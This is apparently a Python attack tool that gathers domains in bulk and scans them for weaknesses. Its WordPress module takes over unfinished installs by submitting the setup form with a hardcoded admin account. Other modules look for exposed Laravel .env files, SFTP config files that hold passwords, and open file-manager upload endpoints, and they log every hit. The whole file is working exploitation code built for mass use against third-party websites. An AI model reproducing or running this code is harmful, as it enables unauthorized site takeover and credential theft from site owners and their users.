try:
	import requests as ex, os, re, socket, sys
	from json import loads as jso
	from time import sleep
	from bs4 import BeautifulSoup as par
	from concurrent.futures import ThreadPoolExecutor as pol
	from requests.packages.urllib3.exceptions import InsecureRequestWarning
	ex.packages.urllib3.disable_warnings(InsecureRequestWarning)
except Exception as ex:
	exit(" [error]=> " + str(ex))

clear = lambda: os.system("clear") if "linux" in sys.platform.lower() else os.system("cls")
header = lambda: {"User-Agent": "Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36"}

def writer(name, content):
	try:
		if content.strip() in open(name, "r").read():
			pass
		else:
			open(name, "a+").write(content.strip().replace("\n","")+"\n")
	except FileNotFoundError:
		open(name, "a+").write(content.strip().replace("\n","")+"\n")

def Choose():
	tnya = input(" -> Mass or Single? [M/S]: ")
	while tnya not in list("MmSs"):
		print(" -> option is not available")
		tnya = input(" -> Mass or Single? [M/S]: ")
	if tnya in list("Mm"):
		while True:
			file = input(" -> insert File: ")
			try:
				cek = open(file,"r",encoding="utf-8").read().strip().split("\n")
				break
			except:
				print(" -> file not found")
		return cek
	else:
		trget = input(" -> target site/host: ")
		while trget == "":
			trget = input(" -> target site/host: ")
		return trget.split()


def checkerWP(domain):
	domen = [e for e in re.findall(r"(?:(?:https?://)?(?:www\d?\.)?|www\d?\.)?([^\s/]+)", domain)][0]
	cok = ex.get("https://sub-scan-api.reverseipdomain.com/?domain="+domen).text
	fetch = [x.replace("www.","") for x in jso(cok)["result"]["domains"]]
	if len(fetch) == 0:fetch.append(domen)

	#--> minimalize <----
	DIR = [
		"/wp", "/new", "/old", "/lama", "/baru", "/backup", "/Wordpress",
		"/wordpress", "/WordPress", "/WP", "/WORDPRESS",
		"/",
	]
	for ye in fetch:
		for yoy in DIR:
			urk = ["https://"+e for e in re.findall(r"(?:(?:https?://)?(?:www\d?\.)?|www\d?\.)?([^\s/]+)", ye)][0]
			url = urk + yoy
			try:
				cek = ex.get(url + "/wp-admin/install.php", allow_redirects=True, headers=header(), verify=False, timeout=10).text
				if "admin_password" in str(cek) or "language-continue" in str(cek) or "weblog_title" in str(cek) or "install.php?step=2" in str(cek) or 'action="?step=0"' in str(cek):
					data = {
						"weblog_title": "admin",
						"user_name": "rizkydev",
						"language": "", "blog_public": "0",
						"admin_password2": "123madefaka",
						"admin_password": "123madefaka",
						"admin_email": "lawlietindo15@gmail.com",
						"Submit": "Install WordPress"
					}
					posted = ex.post(url + "/wp-admin/install.php?step=2", data=data, headers=header(), verify=False, allow_redirects=True).text
					if "/wp-login.php" in posted:
						writer("results/install.txt", url+"/wp-login.php#rizkydev@123madefaka")
						print("   +> "+url+"/wp-login.php#rizkydev@123madefaka")
					else:
						writer("results/install.txt", url+"/wp-admin/setup-config.php")
						print("   +> "+url+"/wp-admin/setup-config.php")
				else:
					print("   +> "+url)
			except:
				pass

def checkerRFM(domain):
	domen = [e for e in re.findall(r"(?:(?:https?://)?(?:www\d?\.)?|www\d?\.)?([^\s/]+)", domain)][0]
	cok = ex.get("https://sub-scan-api.reverseipdomain.com/?domain="+domen).text
	fetch = [x.replace("www.","") for x in jso(cok)["result"]["domains"]]
	if len(fetch) == 0:fetch.append(domen)

	#--> minimalize <----
	DIR = ['/assets/filemanager/', '/assets/file-manager/',
		'/assets/filemanagers/', '/assets/filemanager/dialog.php',
		'/asset/filemanager/dialog.php', '/asset/filemanager/',
		'/asset/file-manager/', '/asset/filemanagers/',
		'/filemanager/', '/filemanager/dialog.php'
		'/assets/admin/js/filemanager/', '/admin/assets/filemanager/',
		'/dashboard/assets/filemanager/', '/media/filemanager/dialog.php',
		'/assets/plugins/filemanager/dialog.php',
		'/assets/admin/js/tinymce/plugins/filemanager/dialog.php',
		'/plugins/filemanager/dialog.php',
		'/plugins/filemanager/', '/filemanager/',
		'/contents/filemanager/dialog.php',
		'/templates/filemanager/dialog.php',
		'/file-manager/dialog.php', '/fileman/dialog.php',
		'/vendor/filemanager/dialog.php', '/api/vendor/filemanager/',
		'/api/vendor/filemanager/dialog.php'
	]
	for ye in fetch:
		url = ["https://"+e for e in re.findall(r"(?:(?:https?://)?(?:www\d?\.)?|www\d?\.)?([^\s/]+)", ye)][0]
		for tuhan in DIR:
			try:
				path = url + tuhan
				cek = ex.get(path, allow_redirects=True, headers=header(), verify=False, timeout=10).text
				if "Responsive FileManager" in str(cek) or "chmod_files_allowed" in str(cek) or "lang_filename" in str(cek):
					writer("results/rfm_checker.txt", path)
					print("   +> "+path)
				else:
					print("   +> "+path)
			except:
				print("   +> "+path)

def checkerCKE(domain):
	domen = [e for e in re.findall(r"(?:(?:https?://)?(?:www\d?\.)?|www\d?\.)?([^\s/]+)", domain)][0]
	cok = ex.get("https://sub-scan-api.reverseipdomain.com/?domain="+domen).text
	fetch = [x.replace("www.","") for x in jso(cok)["result"]["domains"]]
	if len(fetch) == 0:fetch.append(domen)

	#--> minimalize <----
	DIR = ["/ckeditor/kcfinder/upload.php","/kcfinder/upload.php","/assets/kcfinder/upload.php","/webboard/plugins/editors/kcfinder/upload.php","/admin/editor/kcfinder/upload.php","/ckeditor/plugins/kcfinder/upload.php","/admin-panel/vendor/kcfinder/upload.php","/assets/plugin/kcfinder/upload.php","/plugins/kcfinder/upload.php","/admin/kcfinder/upload.php","/vendor/kcfinder/upload.php","/painel/kcfinder/upload.php","/panel/kcfinder/upload.php","/yonetim/engine/ckeditor/kcfinder/upload.php","/assets/admin/js/kcfinder/upload.php","/js/kcfinder/upload.php","/upload/kcfinder/upload.php","/site/plugins/kcfinder/upload.php","/assets/js/kcfinder/upload.php","/app/libraries/kcfinder/upload.php","/modules/kcfinder/upload.php","/lib/kcfinder/upload.php","/uploads/kcfinder/upload.php","/storage/app/kcfinder/upload.php","/inc/kcfinder/upload.php","/assets/ckeditor/kcfinder/upload.php","/resources/kcfinder/upload.php","/modules/admin/editor/kcfinder/upload.php","/system/kcfinder/upload.php","/assets/admin/plugins/kcfinder/upload.php","/en/kcfinder/upload.php","/plugin/ckeditor/kcfinder/upload.php","/data/kcfinder/upload.php","/core/kcfinder/upload.php","/files/kcfinder/upload.php","/admin/public/kcfinder/upload.php","/media/kcfinder/upload.php","/modules/ckeditor/kcfinder/upload.php","/plugin/kcfinder/upload.php","/system/libraries/kcfinder/upload.php","/foo/kcfinder/upload.php","/bar/kcfinder/upload.php","/test/kcfinder/upload.php","/tmp/kcfinder/upload.php","/secret/kcfinder/upload.php","/logs/kcfinder/upload.php","/config/kcfinder/upload.php","/private/kcfinder/upload.php","/data/uploads/kcfinder/upload.php","/images/kcfinder/upload.php","/uploads/cache/kcfinder/upload.php","/assets/css/kcfinder/upload.php","/upload/images/kcfinder/upload.php","/img/kcfinder/upload.php","/filemanager/kcfinder/upload.php","/storage/kcfinder/upload.php","/uploads/files/kcfinder/upload.php","/gallery/kcfinder/upload.php","/vendor/assets/kcfinder/upload.php","/uploads/images/kcfinder/upload.php","/files/docs/kcfinder/upload.php","/config/config.kcfinder/upload.php","/assets/kcfinder/src/","/data/files/kcfinder/upload.php","/includes/kcfinder/upload.php","/resources/views/kcfinder/upload.php","/upload/files/kcfinder/upload.php","/cache/kcfinder/upload.php","/uploads/uploadfiles/kcfinder/upload.php","/library/kcfinder/upload.php","/system/assets/kcfinder/upload.php","/js/ckeditor/kcfinder/upload.php","/data/upload/kcfinder/upload.php","/tmp/cache/kcfinder/upload.php","/lib/ckeditor/kcfinder/upload.php","/data/file/kcfinder/upload.php","/js/libs/kcfinder/upload.php","/files/data/kcfinder/upload.php","/css/kcfinder/upload.php","/plugins/ckeditor/kcfinder/upload.php","/upload/images/uploads/kcfinder/upload.php","/site/ckeditor/kcfinder/upload.php","/assets/css/admin/kcfinder/upload.php","/uploads/uploads/kcfinder/upload.php","/public/kcfinder/upload.php","/upload/uploads/kcfinder/upload.php","/cache/images/kcfinder/upload.php","/app/assets/kcfinder/upload.php","/assets/cms/kcfinder/upload.php","/uploads/uploads/uploads/kcfinder/upload.php","/css/admin/kcfinder/upload.php","/uploads/files/files/kcfinder/upload.php","/upload/images/images/kcfinder/upload.php","/uploads/data/kcfinder/upload.php","/uploads/images/upload/kcfinder/upload.php","/uploads/images/files/kcfinder/upload.php","/uploads/data/files/kcfinder/upload.php","/ckeditor/kcfinder/upload.phpkcfinder/upload.php","/assets/kcfinder/upload.phpckeditor/","/uploads/upload/kcfinder/upload.php","/fileuploads/kcfinder/upload.php","/uploads/images/images/uploads/kcfinder/upload.php","/uploads/upload/upload/kcfinder/upload.php","/uploads/files/uploads/kcfinder/upload.php","/assets/ckeditor/plugins/kcfinder/upload.php","/uploads/images/upload/images/kcfinder/upload.php","/uploads/images/files/uploads/kcfinder/upload.php","/uploads/images/uploadfiles/kcfinder/upload.php","/uploads/files/upload/images/kcfinder/upload.php","/uploads/images/files/upload/kcfinder/upload.php"]
	for ye in fetch:
		url = ["https://"+e for e in re.findall(r"(?:(?:https?://)?(?:www\d?\.)?|www\d?\.)?([^\s/]+)", ye)][0]
		for tuhan in DIR:
			try:
				path = url + tuhan
				cek = ex.get(path, allow_redirects=True, headers=header(), verify=False, timeout=10).text
				if "Resources Browser" in str(cek) or "frmUploadWorker" in str(cek) or "frmActualFolder" in str(cek) or "alert('Unknown error')" in str(cek):
					writer("results/ckeditor.txt", path)
					print("   +> "+path)
				else:
					print("   +> "+path)
			except:
				print("   +> "+path)

def checkerFTP(domain):
	domen = [e for e in re.findall(r"(?:(?:https?://)?(?:www\d?\.)?|www\d?\.)?([^\s/]+)", domain)][0]
	cok = ex.get("https://sub-scan-api.reverseipdomain.com/?domain="+domen).text
	fetch = [x.replace("www.","") for x in jso(cok)["result"]["domains"]]
	if len(fetch) == 0:fetch.append(domen)

	#--> minimalize <----
	DIR = [
		"/sftp-config.json",
		"/ftp-config.json",
		"/config.json",
		"/.vscode/sftp.json",
		"/sftp.json",
		"/.vscode/ftp.json",
		"/ftp.json",
		"/.vscode/ftp-config.json",
		"/.vscode/sftp-config.json"
		"/vendor/.vscode/ftp.json",
		"/vendor/.vscode/sftp.json",
		"/vendor/.vscode/sftp-config.json"
	]
	for ye in fetch:
		url = ["https://"+e for e in re.findall(r"(?:(?:https?://)?(?:www\d?\.)?|www\d?\.)?([^\s/]+)", ye)][0]
		for tuhan in DIR:
			try:
				path = url + tuhan
				cek = ex.get(path, allow_redirects=True, headers=header(), verify=False, timeout=10).json()
				if len(cek["host"]) != 0 and len(cek["password"]) != 0:
					writer("results/sftp.txt", path)
					print("   +> "+path)
				else:
					print("   +> "+path)
			except:
				print("   +> "+path)

def checkerENV(domain):
	domen = [e for e in re.findall(r"(?:(?:https?://)?(?:www\d?\.)?|www\d?\.)?([^\s/]+)", domain)][0]
	cok = ex.get("https://sub-scan-api.reverseipdomain.com/?domain="+domen).text
	fetch = [x.replace("www.","") for x in jso(cok)["result"]["domains"]]
	if len(fetch) == 0:fetch.append(domen)

	#--> minimalize <----
	DIR = ['.env', '../.env', '../../.env', '../../../.env', 'vendor/.env ', 'lib/.env ', 'lab/.env  ', 'cronlab/.env', 'cron/.env', 'core/.env', 'core/app/.env', 'core/Database/.env ', 'database/.env ', 'system/.env', 'config/.env ', 'assets/.env ', 'fileweb/.env', 'l53/.env', 'club/.env', 'app/.env ', 'apps/.env', 'uploads/.env ', 'sitemaps/.env ', 'site/.env ', 'admin/.env ', 'web/.env ', 'public/.env ', 'resources/.env', 'sistema/.env', 'en/.env ', 'tools/.env', 'clientes/.env', 'clientes/laravel_inbox/.env', 'clientes/laravel/.env', 'v1/.env ', 'administrator/.env ', 'laravel/.env']
	for ye in fetch:
		url = ["https://"+e for e in re.findall(r"(?:(?:https?://)?(?:www\d?\.)?|www\d?\.)?([^\s/]+)", ye)][0]
		for tuhan in DIR:
			try:
				path = url + "/" + tuhan
				cek = ex.get(path, allow_redirects=True, headers=header(), verify=False, timeout=10).text
				if "DB_CONNECTION" in cek and "DB_HOST" in cek and "DB_PORT" in cek:
					writer("results/environment.txt", path)
					print("   +> "+path)
				else:
					print("   +> "+path)
			except:
				print("   +> "+path)

def checkerTM(domain):
	domen = [e for e in re.findall(r"(?:(?:https?://)?(?:www\d?\.)?|www\d?\.)?([^\s/]+)", domain)][0]
	cok = ex.get("https://sub-scan-api.reverseipdomain.com/?domain="+domen).text
	fetch = [x.replace("www.","") for x in jso(cok)["result"]["domains"]]
	if len(fetch) == 0:fetch.append(domen)

	DIR = [
		"/tinymce",
		"/file-manager/tinymce",
		"/vendor/file-manager/tinymce",
		"/filemanager/tinymce/",
		"/php/file-manager/tinymce",
		"/assets/file-manager/tinymce",
		"/assets/php/file-manager/tinymce",
		"/data/file-manager/tinymce",
		"/assets/tinymce",
		"/vendor/filemanager/tinymce",
		"/filemanager",
		"/file-manager",
		"/public/file-manager/tinymce"
		"/vendor/tinymce",
		"/assets/tinymce",
		"/fm/tinymce",
	]
	for ye in fetch:
		url = ["https://"+e for e in re.findall(r"(?:(?:https?://)?(?:www\d?\.)?|www\d?\.)?([^\s/]+)", ye)][0]
		for tuhan in DIR:
			try:
				path = url + tuhan
				cek = ex.get(path, allow_redirects=True, headers=header(), verify=False, timeout=10).text
				if "file-manager.js" in cek and "tinymce.activeEditor" in cek and "FileBrowserDialogue.mySubmit" in cek or 'id="fm-main-block"' in cek:
					writer("results/filemanager.txt", path)
					print("   +> "+path)
				else:
					print("   +> "+path)
			except:
				print("   +> "+path)

def reverseIP(domain, model):
	app = []
	url = re.findall(r"(?:(?:https?://)?(?:www\d?\.)?|www\d?\.)?([^\s/]+)", domain)[0]
	if len(url) == 0:
		dom = url
	else:
		try:
			dom = socket.gethostbyname(url)
		except:
			dom = url
	try:
		e = ex.get("https://s53.reverseipdomain.com/?ip="+dom+"&api_key=LVUUJ1YYTYPP7&limit=10000").json()
		if e["status"] == 401:pass
		else:
			for x in e["result"]:
				app.append(x)
	except:
		pass
	if len(app) == 0:pass
	else:
		for main in app:
			if model == "wp":
				checkerWP(main)
			elif model == "rfm":
				checkerRFM(main)
			elif model == "cke":
				checkerCKE(main)
			elif model == "sftp":
				checkerFTP(main)
			elif model == "env":
				checkerENV(main)
			elif model == "tinymce":
				checkerTM(main)

class Grabber:
	def __init__(self):
		self.req = ex.Session()
		self.count = 0
		self.head = {"user-agent": "chrome"}
	def grabber_one(self, page):
		cek = par(self.req.get("https://urlwebsite.com/id?page="+page, headers=self.head).text, "html.parser")
		for a in cek.find_all("img", {"class":"img-thumbnail website_ico"}):
			for x in list("\|/-"):
				print("\r "+x+" Collect "+str(self.count)+" Domain.. ", end="")
				sleep(0.01)
			self.count += 1
			open("grabber.txt", "a+").write(a.get("alt")+"\n")
	def grabber_two(self, page):
		cek = par(self.req.get("https://builtwith.com/top-sites/Indonesia?PAGE="+page, headers=self.head).text, "html.parser")
		reg = re.findall("data-domain=\"(.*?)\"\s", str(cek))
		for a in reg:
			for x in list("\|/-"):
				print("\r "+x+" Collect "+str(self.count)+" Domain.. ", end="")
				sleep(0.01)
			self.count += 1
			open("grabber.txt", "a+").write(a.strip()+"\n")
	def grabber_three(self, urls, page):
		cek = self.req.get(urls+page+"/", headers=self.head)
		while cek.status_code != 200:
			cek = self.req.get(urls+page+"/", headers=self.head)
		cek = par(cek.text, "html.parser")
		tbody = cek.find("tbody")
		for hrf in tbody.find_all("a"):
			for x in list("\|/-"):
				print("\r "+x+" Collect "+str(self.count)+" Domain.. ", end="")
				sleep(0.01)
			self.count += 1
			open("grabber.txt", "a+").write(hrf.text.strip()+"\n")
	def grab_last(self, deli, target):
		page = 0
		while True:
			page += 1
			cek = self.req.get(deli+"?page="+str(page), headers=self.head).text
			if "No domains found." in cek:
				break
			else:
				parser = par(cek, "html.parser")
				for x in parser.find_all("a", {"target": "_blank"}):
					value = x.get("href").replace("https://","").replace("http://","")
					self.count += 1
					open("grabber.txt", "a+").write(value+"\n")
					for x in list("\|/-"):
						print("\r  "+x+" Grabbber "+str(self.count)+" Domain ", end="")
						sleep(0.01)
				break


def grabberDomain(filter):
	fil = filter.lstrip(".")
	grab = Grabber()
	for a in range(1, 4021):
		grab.grabber_one(str(a))
	for b in range(1, 18):
		grab.grabber_two(str(b))
	for c in range(1, 1500):
		grab.grabber_three("https://www.topsitessearch.com/domains/"+fil+"/", str(c))

	# grab last
	cek = ex.get("https://www.xploredomains.com/", headers=header()).text
	res = re.findall("href=\"(.*?/\d+-\d+-\d+)\"", str(cek))
	for x in res:
		grab.grab_last(x, fil)


def domaintoIP(dom):
	for yss in dom:
		try:
			cv = socket.gethostbyname(yss)
			print("\r -> "+cv[:8]+" submitted in iplist ", end="")
			writer("iplist.txt",cv)
		except:
			pass

def main():
	print("""

  _________.__               .__
 /   _____/|__| _____ ______ |  |   ____
 \_____  \ |  |/     \\\____ \|  | _/ __ \\
 /        \|  |  Y Y  \  |_> >  |_\  ___/
/_______  /|__|__|_|  /   __/|____/\___  >
        \/          \/|__|             \/

    01. Grabber Domain
    02. Filtering Domain to IP
    03. Wpinstall exploit scanner
    04. Responsive filemanager scanner
    05. CKeditor/KCFinder Scanner
    06. Sftp/ftp checker
    07. Laravel env scanner
    08. Filemanager tinymce scanner
    00. Exit program
	""")
	chs = input(" -> choose: ")
	while chs == "" or not chs.isdigit():
		chs = input(" -> choose: ")
	if chs in ["0","00"]:
		exit(" -> Bye byee..\n")
	elif chs in ["1","01"]:
		filter = input(" -> Target Domain: ")
		print(" -> Process start, please wait..\n")
		with pol(max_workers=10) as sub:
			sub.submit(grabberDomain, filter)
		exit("\n -> Process done, restart please..\n")
	elif chs in ["2","02"]:
		chh = Choose()
		with pol(max_workers=10) as sub:
			sub.submit(domaintoIP, chh)
		exit("\n -> Process done, restart please..\n")
	elif chs in ["3","03"]:
		chh = Choose()
		print(" -> Process start, please wait..\n")
		with pol(max_workers=20) as sub:
			for ytt in chh:
				sub.submit(reverseIP, ytt, "wp")
		exit("\n -> Process done, enjoy..\n\n")
	elif chs in ["4","04"]:
		chh = Choose()
		print(" -> Process start, please wait..\n")
		with pol(max_workers=10) as sub:
			for ytt in chh:
				sub.submit(reverseIP, ytt, "rfm")
		exit("\n -> Process done, enjoy..\n\n")
	elif chs in ["5","05"]:
		chh = Choose()
		print(" -> Process start, please wait..\n")
		with pol(max_workers=10) as sub:
			for ytt in chh:
				sub.submit(reverseIP, ytt, "cke")
		exit("\n -> Process done, enjoy..\n\n")
	elif chs in ["6","06"]:
		chh = Choose()
		print(" -> Process start, please wait..\n")
		with pol(max_workers=10) as sub:
			for ytt in chh:
				sub.submit(reverseIP, ytt, "sftp")
		exit("\n -> Process done, enjoy..\n\n")
	elif chs in ["7","07"]:
		chh = Choose()
		print(" -> Process start, please wait..\n")
		with pol(max_workers=10) as sub:
			for ytt in chh:
				sub.submit(reverseIP, ytt, "env")
		exit("\n -> Process done, enjoy..\n\n")
	elif chs in ["8","08"]:
		chh = Choose()
		print(" -> Process start, please wait..\n")
		with pol(max_workers=10) as sub:
			for ytt in chh:
				sub.submit(reverseIP, ytt, "tinymce")
		exit("\n -> Process done, enjoy..\n\n")
	else:
		exit(" -> option not available, restart again\n")


if __name__=="__main__":
	try:os.mkdir("results")
	except:pass
	clear()
	main()
